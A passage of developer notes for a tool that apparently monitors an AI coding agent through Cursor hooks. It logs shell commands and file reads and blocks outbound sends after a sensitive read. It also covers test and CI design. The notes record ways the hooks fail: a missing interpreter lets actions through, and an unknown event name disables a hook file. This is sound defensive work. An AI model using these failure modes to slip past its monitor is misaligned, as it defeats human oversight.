  link, not the owner's, writable by others, invalid, an R1 below the minimum) or a recorder that
  rejected the file (the default is in force), asks for a restart after a fix, and never fails
  because the recorder is down. An edited file that started from an older default is ok.
- Parallel run (`tests/test_parallel.py`, F7): under `-n auto --dist loadgroup` every test has
  its own `HOME`, temporary folders and ports. `free_port` picks a random free port from
  20000-32767, below where the system hands out port 0 (macOS 49152-65535), whose remainder by
  the worker count is the worker's own number (`PYTEST_XDIST_WORKER[_COUNT]`); `StubRecorder`
  lets the system pick its port. So no other worker's `free_port` and no port-0 bind can take a
  port between its check and the moment a subprocess binds it, and a worker does not repeat a
  port within 64 calls (a crashed worker's replacement, gw8 of 8, can share a class with a live
  worker; a stranger process can still win the race).
  The package tests (one wheel build, files planted in the install and put back) carry
  `xdist_group(name="package")`. A test that asserts a time limit or leans on a sleep carries
  `@wallclock` (`tests/helpers.py`), put there by hand. The check sees only this: a test whose
  own body names `perf_counter` or `monotonic` and lacks the mark fails, and so does a module
  that names either and never uses `@wallclock`. `time.time`, `sleep`, a `join` timeout and a
  helper that times for the test are not scanned. Each group runs on one worker, in file order.
  `strict_markers` makes an unknown marker an error, serial or parallel.
- CI (`tests/test_ci_workflow.py`, F7): `ci.yml` is read with a small YAML-subset parser that
  refuses syntax it does not know. The suite fails if the file gains a trigger beyond main pushes
  and pull requests, a write permission, a `uses:` not pinned to a 40-character SHA or not one
  of the three approved actions, a `with:` input beyond the list for that action (no token, no
  cache, checkout keeps no credentials), a `secrets` word, a runner other than `macos-15`, or a
  `run:` of more than one line (one command per step: `bash -e` carries on past a failed `a`
  in `a && b`); or if it loses the cancel of an older pull-request run, `uv sync --locked` or
  one of the three check commands above (read from this file, run in this order).

## Hook facts (fill in after the logging stage)
- Config file (today's dev setup): `.cursor/hooks.json` — **gitignored** (whole
  `.cursor/`); create with `./install.sh`. v1 registers the hooks once in the
  system-owned `/Library/Application Support/Cursor/hooks.json` (SPEC section
  3). Project hooks need a trusted folder; restart Cursor if hooks do not load.
  Do not commit machine-local hook config.
- Events used: `beforeShellExecution`, `beforeReadFile`, `beforeMCPExecution`,
  `afterFileEdit`, `preToolUse`.
- Deny answer: `{"permission":"deny","user_message":"...","agent_message":"..."}`
  on stdout, exit code 0. Exit code 2 also blocks. Invalid JSON blocks.
- Real input fields seen on this machine (Cursor 3.5.17):
  - Common: `conversation_id`, `session_id` (same value), `generation_id`,
    `model`, `hook_event_name`, `cursor_version`, `workspace_roots`,
    `user_email`, `transcript_path`
  - `beforeShellExecution`: `command`, `cwd` (may be `""`), `sandbox` (bool)
  - `beforeReadFile`: `file_path`, `attachments` (list); `content` arrives but
    is dropped by the hook client before writing the log
  - Session key for the server: use `conversation_id` (confirmed)
  - Helper path: `agentfly/hook_client.py` (`agentfly-hook`); `./install.sh` wires
    the shim `hooks/hook.py`. Log: `~/.local/share/agentfly/logs/events.jsonl`
    (dir 700, file 600). Compat shim: `recorder/hook_passthrough.py` (delegates
    to `hooks/hook.py`).
  - Helper POSTs sanitized JSON to `http://127.0.0.1:8787/hook` with
    `X-Recorder-Token` (from `~/.config/agentfly/token`); offline guard if
    the server is down, slow or answers 401/403.
  - R1 (first entry of `agentfly/rules/default.toml`, engine in `agentfly/recorder/rules.py`):
    mark on a sensitive read/shell word, then block outbound sends; sessions in
    `~/.local/share/agentfly/sessions.json`.
  - Replay: `uv run python fake_agent.py` (scenarios in `demo/scenario.json`).
  - S1/S2 (Cursor 3.24.12, `docs/spikes/`): `tool_use_id` arrived on
    `preToolUse` and `beforeShellExecution` only (`beforeReadFile` has it from 3.25.9, see
    V2c). `preToolUse.tool_input` keys:
    Shell `command`, `cwd`, `timeout`; Read `file_path`; Write `file_path`,
    `content`; Grep `file_path`, `pattern`. `ask` from `beforeShellExecution`
    pauses the agent (Skip / Always Run / Run); an allow with messages shows
    nothing. The system `hooks.json` runs alongside user and project hooks.
  - S5 (Cursor 3.24.12): a subagent has its own `conversation_id` and carries
    `parent_tool_call_id` on every event (D21 A links it to the parent's mark).
    One unknown event name disables a whole `hooks.json` (D23);
    `~/.claude/settings.json` is a third hook source (D24).
  - V3a (Cursor 3.25.9, 2026-10-18): the system file loads at start-up only (Hooks log:
    `Loaded N enterprise hook(s)` / `No enterprise hooks configuration found`); Settings →
    Hooks does not list system hooks. A missing interpreter exits 127 and Cursor lets the
    action through; a missing client file exits 2 and Cursor denies everything. A
    `~/.claude/settings.json` allow did not cancel our shell deny (one trial).
  - V2c (Cursor 3.25.9, `docs/spikes/V2c-capture.md`): `beforeShellExecution` carries the
    same `tool_use_id` as its `preToolUse` Shell (34 of 34) and `beforeReadFile` as its
    `preToolUse` Read (28 of 28; all read paths absolute). One id covers an edit's Read and
    Write; `afterFileEdit` has no id and fired for a create only; parallel reads' halves can
    return in reverse order. A Read of a missing file fires no `beforeReadFile`. The server
    merges by id, with a path fallback (SPEC section 8 "Duplicates").
  - Checkpoint A (hard-coded T0 curl deny): done — decision **continue**;
    notes in `demo/NOTES.md`; T0 disabled in the hook client.
